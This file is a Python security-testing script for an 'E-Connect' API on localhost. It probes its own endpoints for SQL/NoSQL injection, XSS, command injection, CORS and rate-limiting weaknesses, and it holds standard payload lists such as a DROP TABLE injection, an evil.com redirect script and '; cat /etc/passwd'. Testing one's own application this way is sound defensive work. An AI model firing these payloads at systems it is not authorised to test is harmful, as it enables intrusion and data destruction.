#!/usr/bin/env python3
"""
E-Connect Security Testing - Phase 2: API Security Testing
===========================================================
This module tests API security vulnerabilities including SQL injection,
XSS, input validation, and API endpoint security.
"""

import requests
import json
import time
import base64
from datetime import datetime
from urllib.parse import urljoin, quote
import hashlib

class Phase2ApiSecurityTester:
    def __init__(self, base_url="http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.test_results = []
        self.admin_token = None
        self.user_token = None
        
    def log_test(self, category, test_name, status, details="", severity="INFO"):
        """Log test results with categorization"""
        result = {
            "timestamp": datetime.now().isoformat(),
            "category": category,
            "test_name": test_name,
            "status": status,
            "details": details,
            "severity": severity
        }
        self.test_results.append(result)
        
        # Color coding for console output
        colors = {
            "PASS": "\033[92m✓",
            "FAIL": "\033[91m✗", 
            "WARN": "\033[93m⚠",
            "INFO": "\033[94mℹ",
            "CRITICAL": "\033[95m🚨"
        }
        reset = "\033[0m"
        
        print(f"{colors.get(status, '')} [{category}] {test_name}: {details}{reset}")

    # ========================================================================
    # SQL/NoSQL Injection Testing
    # ========================================================================
    
    def test_sql_injection_attacks(self):
        """Test SQL/NoSQL injection vulnerabilities"""
        self.log_test("INJECTION", "SQL/NoSQL Injection Testing", "INFO", "Testing injection vulnerabilities...")
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users--",
            "1' OR '1'='1' /*",
            "' OR ''='",
            "1' OR 1=1#",
            "x' AND 1=1 UNION SELECT 1,2,3,4--",
            "' OR 'x'='x"
        ]
        
        # NoSQL injection payloads (MongoDB specific)
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "1==1"},
            {"$or": [{"password": {"$ne": None}}, {"password": {"$exists": True}}]},
            {"$regex": ".*"},
            {"$nin": [""]},
            {"$not": {"$eq": ""}},
            {"password": {"$regex": ".*"}}
        ]
        
        # Test endpoints vulnerable to injection
        injection_endpoints = [
            ("/signin", {"email": "test", "password": "test"}),
            ("/signup", {"email": "test", "password": "test", "name": "test"}),
            ("/id", {"id": "test"}),
            ("/clock-records/test", {}),
            ("/leave-History/test", {}),
            ("/get_EmployeeId/test", {})
        ]
        
        # Test SQL injection
        for endpoint, base_data in injection_endpoints:
            for payload in sql_payloads[:5]:  # Test first 5 payloads
                self._test_injection_payload(endpoint, base_data, payload, "SQL")
        
        # Test NoSQL injection
        for endpoint, base_data in injection_endpoints[:3]:  # Test first 3 endpoints
            for payload in nosql_payloads[:3]:  # Test first 3 payloads
                if base_data:  # Only for POST endpoints
                    self._test_nosql_injection_payload(endpoint, base_data, payload)
    
    def _test_injection_payload(self, endpoint, base_data, payload, injection_type):
        """Test individual injection payload"""
        try:
            # Test in different fields
            test_data = base_data.copy()
            
            # Try payload in each field
            for field in test_data.keys():
                test_data[field] = payload
                
                if endpoint.startswith("/") and "{" not in endpoint:
                    # POST endpoint
                    response = self.session.post(f"{self.base_url}{endpoint}", json=test_data)
                else:
                    # GET endpoint with path parameter
                    endpoint_with_payload = endpoint.replace("test", quote(str(payload)))
                    response = self.session.get(f"{self.base_url}{endpoint_with_payload}")
                
                # Check for injection success indicators
                if self._check_injection_success(response, injection_type):
                    self.log_test("INJECTION", f"{injection_type} Injection - {endpoint}", "FAIL", 
                                f"Potential {injection_type} injection in field '{field}': {payload}", "CRITICAL")
                    return
                
                test_data[field] = base_data[field]  # Reset field
            
        except Exception as e:
            self.log_test("INJECTION", f"{injection_type} Injection - {endpoint}", "ERROR", str(e))
    
    def _test_nosql_injection_payload(self, endpoint, base_data, payload):
        """Test NoSQL injection payload"""
        try:
            test_data = base_data.copy()
            
            # Try payload in password field (common target)
            if "password" in test_data:
                test_data["password"] = payload
                
                response = self.session.post(f"{self.base_url}{endpoint}", json=test_data)
                
                if self._check_injection_success(response, "NoSQL"):
                    self.log_test("INJECTION", f"NoSQL Injection - {endpoint}", "FAIL", 
                                f"Potential NoSQL injection in password field: {payload}", "CRITICAL")
                    return
                
        except Exception as e:
            self.log_test("INJECTION", f"NoSQL Injection - {endpoint}", "ERROR", str(e))
    
    def _check_injection_success(self, response, injection_type):
        """Check if injection was successful"""
        try:
            # Status code indicators
            if response.status_code == 200 and injection_type in ["SQL", "NoSQL"]:
                response_text = response.text.lower()
                
                # Success indicators
                success_indicators = [
                    "access_token",
                    "login successful", 
                    "signin successful",
                    "user found",
                    "admin",
                    "success"
                ]
                
                # Error indicators that suggest injection worked
                error_indicators = [
                    "sql syntax",
                    "mysql error",
                    "mongodb error",
                    "duplicate key",
                    "constraint failed",
                    "database error"
                ]
                
                return any(indicator in response_text for indicator in success_indicators + error_indicators)
            
            return False
            
        except Exception:
            return False

    # ========================================================================
    # XSS (Cross-Site Scripting) Testing
    # ========================================================================
    
    def test_xss_vulnerabilities(self):
        """Test XSS vulnerabilities"""
        self.log_test("XSS", "Cross-Site Scripting Testing", "INFO", "Testing XSS vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click</div>",
            "';alert('XSS');//",
            "<script>document.location='http://evil.com'</script>",
            "<img src='x' onerror='eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))'>"
        ]
        
        # Test XSS in form inputs
        xss_endpoints = [
            ("/signup", {"email": "test@test.com", "password": "test", "name": "TEST_PAYLOAD"}),
            ("/signin", {"email": "TEST_PAYLOAD", "password": "test"}),
            ("/leave-request", {"reason": "TEST_PAYLOAD", "userid": "test"}),
            ("/Addcsvjson", {"name": "TEST_PAYLOAD", "data": {}, "fileid": "test"})
        ]
        
        for endpoint, base_data in xss_endpoints:
            for payload in xss_payloads[:5]:  # Test first 5 payloads
                self._test_xss_payload(endpoint, base_data, payload)
    
    def _test_xss_payload(self, endpoint, base_data, payload):
        """Test individual XSS payload"""
        try:
            test_data = base_data.copy()
            
            # Find field to inject payload
            for field, value in test_data.items():
                if value == "TEST_PAYLOAD":
                    test_data[field] = payload
                    break
            
            response = self.session.post(f"{self.base_url}{endpoint}", json=test_data)
            
            # Check if payload is reflected in response
            if payload in response.text:
                self.log_test("XSS", f"XSS Vulnerability - {endpoint}", "FAIL", 
                            f"XSS payload reflected: {payload[:50]}...", "HIGH")
            else:
                self.log_test("XSS", f"XSS Test - {endpoint}", "PASS", 
                            "Payload properly escaped/filtered")
                
        except Exception as e:
            self.log_test("XSS", f"XSS Test - {endpoint}", "ERROR", str(e))

    # ========================================================================
    # Input Validation Testing
    # ========================================================================
    
    def test_input_validation(self):
        """Test input validation mechanisms"""
        self.log_test("INPUT_VALIDATION", "Input Validation Testing", "INFO", "Testing input validation...")
        
        # Test oversized inputs
        self._test_buffer_overflow()
        
        # Test special characters
        self._test_special_characters()
        
        # Test file upload security (if applicable)
        self._test_file_upload_security()
        
        # Test parameter pollution
        self._test_parameter_pollution()
    
    def _test_buffer_overflow(self):
        """Test buffer overflow with oversized inputs"""
        large_strings = [
            "A" * 1000,    # 1KB
            "A" * 10000,   # 10KB
            "A" * 100000,  # 100KB
            "X" * 1000000  # 1MB
        ]
        
        test_endpoints = [
            ("/signup", {"email": "test@test.com", "password": "PAYLOAD", "name": "test"}),
            ("/signin", {"email": "PAYLOAD", "password": "test"})
        ]
        
        for size_test in large_strings[:2]:  # Test first 2 sizes
            for endpoint, base_data in test_endpoints:
                test_data = base_data.copy()
                test_data["password"] = size_test
                
                try:
                    response = self.session.post(f"{self.base_url}{endpoint}", json=test_data, timeout=10)
                    
                    if response.status_code == 500:
                        self.log_test("INPUT_VALIDATION", f"Buffer Overflow - {endpoint}", "WARN", 
                                    f"Server error with {len(size_test)} byte input", "MEDIUM")
                    elif response.status_code == 200:
                        self.log_test("INPUT_VALIDATION", f"Large Input - {endpoint}", "PASS", 
                                    f"Handled {len(size_test)} byte input gracefully")
                        
                except requests.exceptions.Timeout:
                    self.log_test("INPUT_VALIDATION", f"Buffer Overflow - {endpoint}", "FAIL", 
                                f"Timeout with {len(size_test)} byte input - possible DoS", "HIGH")
                except Exception as e:
                    self.log_test("INPUT_VALIDATION", f"Buffer Overflow - {endpoint}", "ERROR", str(e))
    
    def _test_special_characters(self):
        """Test handling of special characters"""
        special_chars = [
            "null\x00byte",
            "newline\ninjection",
            "carriage\rreturn", 
            "tab\tcharacter",
            "unicode\u0000test",
            "emoji😀test",
            "quotes'\"test",
            "backslash\\test"
        ]
        
        for char_test in special_chars[:4]:  # Test first 4
            try:
                response = self.session.post(f"{self.base_url}/signup", json={
                    "email": f"test{char_test}@test.com",
                    "password": "test123",
                    "name": f"Test{char_test}User"
                })
                
                if response.status_code == 500:
                    self.log_test("INPUT_VALIDATION", "Special Characters", "WARN", 
                                f"Server error with special character: {repr(char_test)}", "MEDIUM")
                else:
                    self.log_test("INPUT_VALIDATION", "Special Characters", "PASS", 
                                f"Handled special character: {repr(char_test)}")
                    
            except Exception as e:
                self.log_test("INPUT_VALIDATION", "Special Characters", "ERROR", str(e))
    
    def _test_file_upload_security(self):
        """Test file upload security (if file upload endpoints exist)"""
        # This is a placeholder for file upload testing
        # Implementation would depend on your specific file upload endpoints
        self.log_test("INPUT_VALIDATION", "File Upload Security", "INFO", 
                    "File upload endpoints not detected - manual testing required")
    
    def _test_parameter_pollution(self):
        """Test HTTP parameter pollution"""
        try:
            # Test duplicate parameters
            polluted_params = "email=user1@test.com&email=admin@test.com&password=test"
            
            response = self.session.post(
                f"{self.base_url}/signin",
                data=polluted_params,
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            
            if response.status_code == 200:
                self.log_test("INPUT_VALIDATION", "Parameter Pollution", "WARN", 
                            "Server accepted duplicate parameters", "MEDIUM")
            else:
                self.log_test("INPUT_VALIDATION", "Parameter Pollution", "PASS", 
                            "Server properly handled duplicate parameters")
                            
        except Exception as e:
            self.log_test("INPUT_VALIDATION", "Parameter Pollution", "ERROR", str(e))

    # ========================================================================
    # API Endpoint Security Testing
    # ========================================================================
    
    def test_api_endpoint_security(self):
        """Test API endpoint security"""
        self.log_test("API_SECURITY", "API Endpoint Security", "INFO", "Testing API security...")
        
        # Test HTTP methods
        self._test_http_methods()
        
        # Test CORS configuration
        self._test_cors_configuration()
        
        # Test rate limiting
        self._test_rate_limiting()
        
        # Test error handling
        self._test_error_handling()
    
    def _test_http_methods(self):
        """Test HTTP method validation"""
        methods_to_test = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
        test_endpoints = ["/signin", "/signup", "/attendance/", "/id"]
        
        for endpoint in test_endpoints[:2]:  # Test first 2 endpoints
            for method in methods_to_test[:4]:  # Test first 4 methods
                try:
                    response = self.session.request(method, f"{self.base_url}{endpoint}")
                    
                    if method in ["TRACE"] and response.status_code == 200:
                        self.log_test("API_SECURITY", f"HTTP Methods - {endpoint}", "FAIL", 
                                    f"Dangerous method {method} allowed", "HIGH")
                    elif response.status_code == 405:
                        self.log_test("API_SECURITY", f"HTTP Methods - {endpoint}", "PASS", 
                                    f"Method {method} properly rejected")
                    
                except Exception as e:
                    self.log_test("API_SECURITY", f"HTTP Methods - {endpoint}", "ERROR", str(e))
    
    def _test_cors_configuration(self):
        """Test CORS configuration"""
        try:
            # Test CORS headers
            response = self.session.options(f"{self.base_url}/signin", headers={
                "Origin": "http://evil.com",
                "Access-Control-Request-Method": "POST"
            })
            
            cors_headers = {
                "access-control-allow-origin": response.headers.get("access-control-allow-origin", ""),
                "access-control-allow-methods": response.headers.get("access-control-allow-methods", ""),
                "access-control-allow-headers": response.headers.get("access-control-allow-headers", "")
            }
            
            # Check for overly permissive CORS
            if cors_headers["access-control-allow-origin"] == "*":
                self.log_test("API_SECURITY", "CORS Configuration", "WARN", 
                            "Wildcard (*) origin allowed - potential security risk", "MEDIUM")
            else:
                self.log_test("API_SECURITY", "CORS Configuration", "PASS", 
                            "CORS properly configured")
                            
        except Exception as e:
            self.log_test("API_SECURITY", "CORS Configuration", "ERROR", str(e))
    
    def _test_rate_limiting(self):
        """Test rate limiting on API endpoints"""
        try:
            # Rapid fire requests to test rate limiting
            rapid_requests = 20
            endpoint = "/signin"
            
            responses = []
            start_time = time.time()
            
            for i in range(rapid_requests):
                response = self.session.post(f"{self.base_url}{endpoint}", json={
                    "email": f"test{i}@test.com",
                    "password": "wrongpassword"
                })
                responses.append(response.status_code)
                
                # Check for rate limiting
                if response.status_code == 429:
                    self.log_test("API_SECURITY", "Rate Limiting", "PASS", 
                                f"Rate limiting activated after {i+1} requests")
                    return
            
            end_time = time.time()
            request_rate = rapid_requests / (end_time - start_time)
            
            self.log_test("API_SECURITY", "Rate Limiting", "FAIL", 
                        f"No rate limiting detected - {request_rate:.1f} req/sec processed", "HIGH")
            
        except Exception as e:
            self.log_test("API_SECURITY", "Rate Limiting", "ERROR", str(e))
    
    def _test_error_handling(self):
        """Test error handling and information disclosure"""
        error_test_cases = [
            ("/nonexistent-endpoint", 404),
            ("/signin", 422),  # Invalid JSON
            ("/signup", 400)   # Missing fields
        ]
        
        for endpoint, expected_status in error_test_cases:
            try:
                if endpoint == "/nonexistent-endpoint":
                    response = self.session.get(f"{self.base_url}{endpoint}")
                else:
                    response = self.session.post(f"{self.base_url}{endpoint}", json={})
                
                # Check for information disclosure in error messages
                error_text = response.text.lower()
                sensitive_info = ["stack trace", "file path", "database", "server version", "internal error"]
                
                if any(info in error_text for info in sensitive_info):
                    self.log_test("API_SECURITY", f"Error Handling - {endpoint}", "FAIL", 
                                "Error message contains sensitive information", "MEDIUM")
                elif response.status_code == expected_status or response.status_code in [400, 422]:
                    self.log_test("API_SECURITY", f"Error Handling - {endpoint}", "PASS", 
                                "Proper error handling without information disclosure")
                
            except Exception as e:
                self.log_test("API_SECURITY", f"Error Handling - {endpoint}", "ERROR", str(e))

    # ========================================================================
    # Command Injection Testing
    # ========================================================================
    
    def test_command_injection(self):
        """Test command injection vulnerabilities"""
        self.log_test("COMMAND_INJECTION", "Command Injection Testing", "INFO", "Testing command injection...")
        
        command_payloads = [
            "; ls -la",
            "| whoami",
            "&& echo 'vulnerable'",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| ping -c 3 127.0.0.1",
            "&& dir",  # Windows equivalent
            "; type C:\\Windows\\System32\\drivers\\etc\\hosts"  # Windows
        ]
        
        # Test endpoints that might process file names or system commands
        injection_endpoints = [
            ("/Addcsvjson", {"name": "PAYLOAD", "data": {}, "fileid": "test"}),
            ("/signup", {"email": "test@test.com", "password": "test", "name": "PAYLOAD"})
        ]
        
        for endpoint, base_data in injection_endpoints:
            for payload in command_payloads[:4]:  # Test first 4 payloads
                self._test_command_injection_payload(endpoint, base_data, payload)
    
    def _test_command_injection_payload(self, endpoint, base_data, payload):
        """Test individual command injection payload"""
        try:
            test_data = base_data.copy()
            
            # Replace PAYLOAD with actual payload
            for field, value in test_data.items():
                if value == "PAYLOAD":
                    test_data[field] = payload
                    break
            
            response = self.session.post(f"{self.base_url}{endpoint}", json=test_data)
            
            # Check response time (command injection might cause delays)
            # Check for command output in response
            suspicious_outputs = ["root:", "administrator", "127.0.0.1", "uid=", "gid="]
            
            if any(output in response.text.lower() for output in suspicious_outputs):
                self.log_test("COMMAND_INJECTION", f"Command Injection - {endpoint}", "FAIL", 
                            f"Potential command execution detected: {payload}", "CRITICAL")
            else:
                self.log_test("COMMAND_INJECTION", f"Command Injection - {endpoint}", "PASS", 
                            "No command execution detected")
                
        except Exception as e:
            self.log_test("COMMAND_INJECTION", f"Command Injection - {endpoint}", "ERROR", str(e))

    # ========================================================================
    # Main Test Runner
    # ========================================================================
    
    def run_phase2_tests(self):
        """Run all Phase 2 API security tests"""
        print("🔒 Starting Phase 2: API Security Testing")
        print("=" * 70)
        
        print("\n💉 Testing SQL/NoSQL Injection...")
        self.test_sql_injection_attacks()
        
        print("\n🌐 Testing XSS Vulnerabilities...")
        self.test_xss_vulnerabilities()
        
        print("\n📝 Testing Input Validation...")
        self.test_input_validation()
        
        print("\n🔌 Testing API Endpoint Security...")
        self.test_api_endpoint_security()
        
        print("\n⚡ Testing Command Injection...")
        self.test_command_injection()
        
        # Generate summary report
        self._generate_phase2_report()
    
    def _generate_phase2_report(self):
        """Generate Phase 2 security test report"""
        print("\n" + "="*70)
        print("📊 PHASE 2 API SECURITY TEST SUMMARY")
        print("="*70)
        
        total_tests = len(self.test_results)
        passed = len([r for r in self.test_results if r["status"] == "PASS"])
        failed = len([r for r in self.test_results if r["status"] == "FAIL"])
        warnings = len([r for r in self.test_results if r["status"] == "WARN"])
        errors = len([r for r in self.test_results if r["status"] == "ERROR"])
        
        print(f"Total Tests: {total_tests}")
        print(f"✅ Passed: {passed}")
        print(f"❌ Failed: {failed}")
        print(f"⚠️  Warnings: {warnings}")
        print(f"🔥 Errors: {errors}")
        
        # Categorize critical issues
        critical_issues = [r for r in self.test_results if r["status"] == "FAIL" and r.get("severity") in ["HIGH", "CRITICAL"]]
        
        if critical_issues:
            print(f"\n🚨 CRITICAL API SECURITY ISSUES: {len(critical_issues)}")
            for issue in critical_issues[:5]:
                print(f"  • {issue['category']} - {issue['test_name']}: {issue['details']}")
        
        # Security score
        if total_tests > 0:
            security_score = (passed / total_tests) * 100
            print(f"\n🎯 API Security Score: {security_score:.1f}%")
        
        # Save detailed report
        with open("phase2_api_security_report.json", "w") as f:
            json.dump(self.test_results, f, indent=2)
        
        print(f"\nDetailed report saved to: phase2_api_security_report.json")
        print("="*70)

if __name__ == "__main__":
    tester = Phase2ApiSecurityTester()
    tester.run_phase2_tests()
